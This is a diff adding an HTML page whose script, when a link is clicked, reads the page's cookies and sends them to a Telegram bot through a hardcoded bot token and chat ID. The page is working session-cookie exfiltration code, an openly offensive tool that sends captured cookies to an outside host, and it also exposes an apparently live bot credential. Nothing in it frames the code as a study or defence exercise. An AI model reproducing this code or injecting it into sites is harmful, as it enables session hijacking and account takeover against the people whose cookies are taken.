@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send Cookie to Telegram Bot</title>
+</head>
+<body>
+  <h1>Click the Link Below</h1>
+  <p>When you click the link, the session cookie will be captured and sent to a Telegram bot.</p>
+
+  <!-- Link to "click" -->
+  <a href="#" id="cookieLink">Click Me to Send Cookies to Telegram Bot</a>
+
+  <!-- Display status here -->
+  <h2>Status:</h2>
+  <pre id="status"></pre>
+
+  <script>
+    // Replace with your Telegram bot token and chat ID
+    const BOT_TOKEN = '7085151914:AAF08OGTwZWvxhLyTyK39bsV41YEERmijx0';
+    const CHAT_ID = '6752982813';
+
+    // Function to send a message to the Telegram bot
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const payload = {
+        chat_id: CHAT_ID,
+        text: message,
+      };
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload),
+        });
+
+        const data = await response.json();
+        return data.ok;
+      } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+        return false;
+      }
+    }
+
+    // Function to collect and send cookies
+    async function collectAndSendCookies() {
+      // Get all cookies as a string
+      const cookies = document.cookie;
+
+      // Display the cookies in the status element
+      const statusElement = document.getElementById('status');
+      if (!cookies) {
+        statusElement.textContent = 'No cookies found.';
+        return;
+      }
+
+      statusElement.textContent = 'Sending cookies to Telegram bot...';
+
+      // Send the cookies to the Telegram bot
+      const success = await sendToTelegram(`Captured Cookies: ${cookies}`);
+      if (success) {
+        statusElement.textContent = 'Cookies sent successfully!';
+      } else {
+        statusElement.textContent = 'Failed to send cookies.';
+      }
+    }
+
+    // Add a click event listener to the link
+    document.getElementById('cookieLink').addEventListener('click', function(event) {
+      event.preventDefault(); // Prevent the link from navigating
+      collectAndSendCookies(); // Call the function to collect and send cookies
+    });
+  </script>
+</body>
+</html>
